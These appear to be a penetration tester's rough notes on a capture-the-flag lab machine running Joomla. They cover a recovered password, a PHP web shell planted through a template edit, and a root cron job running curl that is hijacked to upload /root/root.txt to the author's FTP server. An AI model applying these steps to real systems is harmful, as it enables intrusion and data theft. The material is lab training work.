10.10.10.150 

Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-26 11:57 UTC
Nmap scan report for 10.10.10.150
Host is up (0.047s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.03 seconds

# Username recovery tells me about email address not being found?

# JOOMLA VERSION
[+] Joomla version: 3.8.8

# MSF Joomla scannar found

>>> http://10.10.10.150/htaccess.txt
>>> http://10.10.10.150/administrator/index.php

# FILES 

Found secret.txt with something that might be a hash?

Q3VybGluZzIwMTgh --> Curling2018!

When logging in with Floris

You get super user

And can log into to /administator

By going to templates changing the index.php to a shell then clicking "Preview template" you can run php code

Found so tar archive that ended up giving:

>>> floris
>>> 5d<wdCbdZu)|hChXll 

As a password


# Elivating a shell 
python -c 'import pty; pty.spawn("/bin/bash")'  


# By comparing the processes I can see this selection
> 17896 ?        00:00:00 cron
> 17900 ?        00:00:00 sh
> 17901 ?        00:00:00 sleep

# Need to find the local cron job???

# By running "ps -ef" I can see the command run 

>>> /bin/sh -c sleep 1;
>>> cat /root/default.txt > /home/floris/admin_area/input
>>> /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin_area/report


# -K loads a config file called input. We can place in this config file some nice suprises

# Command for the config
# This command uploaded the root.txt file to an external FTP server
echo "url = \"ftp://10.10.14.9:2121\"" > ~/admin-area/input ; echo "upload-file = \"/root/root.txt"" >> ~/admin-area/input


# Temp ftp server
pip install --user pyftpdlib
python -m pyftpdlib --directory=FTP --port=2121 --write

